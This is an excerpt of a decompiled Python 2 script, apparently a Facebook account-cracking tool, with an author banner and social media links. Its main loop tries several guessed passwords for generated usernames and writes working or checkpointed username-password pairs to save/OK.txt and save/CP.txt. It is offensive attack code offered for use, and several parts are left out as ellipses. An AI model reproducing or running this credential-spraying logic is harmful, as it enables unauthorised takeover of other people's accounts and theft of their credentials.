# coding: utf-8
# Decompiled By Talha Islam
# Github : https://github.com/TermuxTalha
# uncompyle6 version 1.1.2
# Original written By Talha 


import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
__author__ = 'Talha'
__copyright = 'All rights reserved . Copyright  TALHA ISLAM'
CorrectUsername = '➳ᴹᴿ᭄𝑻𝒂𝒍𝒉𝒂'
os.system('clear')
loop = 'true'
while (loop == 'true'):
...
\033[94;1m  ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝
\033[1;97m--------------------------------------------------
\033[1;91m Author         <==>➳ᴹᴿ᭄𝑻𝒂𝒍𝒉𝒂
\033[1;91m GitHub        <==>https://github.com/TermuxTalha
\033[1;91m YouTube     <==>Talha Technology Channel
\033[1;91m FACEBOOK <==>Termux Teacher Talha
\033[1;91m VERSOIN   : ________ 0.118.0
\033[1;97m--------------------------------------------------
                                                 """
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;94m  [➳ᴹᴿ᭄𝑻𝒂𝒍𝒉𝒂_OK]  ' + k + c + user + '  ^  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m  [➳ᴹᴿ᭄𝑻𝒂𝒍𝒉𝒂_CP] ' + k + c + user + '  ^  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [➳ᴹᴿ᭄𝑻𝒂𝒍𝒉𝒂_OK] ' + k + c + user + '  ^  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m  [➳ᴹᴿ᭄𝑻𝒂𝒍𝒉𝒂_CP] ' + k + c + user + '  ^  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [➳ᴹᴿ᭄𝑻𝒂𝒍𝒉𝒂_OK]  ' + k + c + user + '  ^  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [➳ᴹᴿ᭄𝑻𝒂𝒍𝒉𝒂_CP] ' + k + c + user + '  ^  ' + pass3
                        cps = open('save/CP.txt', 'a')
